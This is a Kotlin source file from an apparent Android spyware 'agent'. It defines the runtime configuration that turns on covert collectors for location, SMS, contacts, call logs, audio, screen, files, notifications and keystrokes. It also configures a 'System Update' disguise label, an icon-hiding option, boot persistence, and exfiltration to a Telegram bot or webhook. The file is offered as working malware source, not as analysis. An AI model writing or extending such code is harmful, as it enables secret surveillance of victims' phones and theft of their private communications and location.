package com.mobilesvc.agent

import android.content.Context
import org.json.JSONObject

/**
 * Runtime gate for every capability.
 *
 * The binary is identical across deliveries; this file decides what it does. OVERSIGHT writes
 * `assets/oversight_payload.json` when it repacks, and every collector checks a flag here
 * before touching a platform API.
 */
class PayloadConfig private constructor(private val root: JSONObject) {

    val label: String get() = root.optString("label", "System Update")
    val cadenceSec: Int get() = root.optInt("cadence", 30).coerceIn(15, 3600)
    val wifiOnly: Boolean get() = root.optBoolean("wifiOnly", false)
    val hideIcon: Boolean get() = root.optBoolean("hideIcon", false)
    val boot: Boolean get() = root.optBoolean("boot", true)
    val foregroundService: Boolean get() = root.optBoolean("fgs", true)

    val location: Boolean get() = root.optBoolean("loc", false)
    val locationMethod: String get() = root.optString("locMethod", "RADIO")
    val sms: Boolean get() = root.optBoolean("sms", false)
    val contacts: Boolean get() = root.optBoolean("contacts", false)
    val calls: Boolean get() = root.optBoolean("calls", false)
    val audio: Boolean get() = root.optBoolean("audio", false)
    val screen: Boolean get() = root.optBoolean("screen", false)
    val files: Boolean get() = root.optBoolean("files", false)
    val notifications: Boolean get() = root.optBoolean("notif", false)
    val keylog: Boolean get() = root.optBoolean("keylog", false)

    val transport: String get() = root.optString("transport", "TELEGRAM")
    val telegramToken: String get() = root.optString("tgToken", "")
    val telegramChatId: String get() = root.optString("tgChat", "")
    val webhookUrl: String get() = root.optString("webhook", "")

    /** True when at least one reporting channel is configured. */
    val canReport: Boolean
        get() = (telegramToken.isNotBlank() && telegramChatId.isNotBlank()) ||
            webhookUrl.startsWith("https://")

    /**
     * The dangerous permissions this config actually needs, in the order they must be asked.
     *
     * Background location and notification access are deliberately absent — neither can be
     * granted from a dialog, so listing them here would make the caller wait forever for a
     * result that never comes.
     */
    fun requiredRuntimePermissions(): List<String> = buildList {
        if (location) {
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (sms) add(android.Manifest.permission.READ_SMS)
        if (contacts) add(android.Manifest.permission.READ_CONTACTS)
        if (calls) add(android.Manifest.permission.READ_CALL_LOG)
        if (audio) add(android.Manifest.permission.RECORD_AUDIO)
        if (files) {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                add("android.permission.READ_MEDIA_IMAGES")
            } else {
                add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            add("android.permission.POST_NOTIFICATIONS")
        }
    }

    companion object {
        private const val ASSET = "oversight_payload.json"

        fun load(context: Context): PayloadConfig = runCatching {
            val text = context.assets.open(ASSET).use { it.readBytes().toString(Charsets.UTF_8) }
            PayloadConfig(JSONObject(text))
        }.getOrElse { PayloadConfig(JSONObject()) }
    }
}
